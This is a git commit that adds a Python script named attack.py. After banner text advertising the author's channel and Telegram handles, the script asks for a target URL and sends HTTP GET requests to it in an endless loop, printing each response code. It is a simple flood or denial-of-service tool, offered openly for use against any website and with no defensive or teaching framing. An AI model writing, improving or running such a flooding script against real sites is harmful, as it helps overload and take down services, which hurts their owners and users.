2e6fd471f76d957b26ac944f569b7a2552348da9
Afton <134857999+Aftongamer@users.noreply.github.com>
2025-01-07 23:59:31 -0800

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,33 @@
+import requests, time, os
+
+
+text = "Hi my name is Afton"
+texts = ""
+for i in text:
+    os.system("cls")
+    texts += i
+    print(f"{texts}|")
+    time.sleep(0.1)
+os.system("clear")
+print(texts)
+print("loding ...")
+time.sleep(10)
+text = "my channel is : @Aftonplus , my id telegram = @Aftonplus1 exit = Ctrl + C"
+texts = ""
+for i in text:
+    os.system("cls")
+    texts += i
+    print(f"{texts}|")
+    time.sleep(0.1)
+os.system("clear")
+print(texts)
+print("loding ...")
+time.sleep(10)
+print("your url (http:// or https://)")
+url = input("URL : ")
+
+while True:
+    response = requests.get(url=url)
+    print(f"send code : {response.status_code}")
+
+
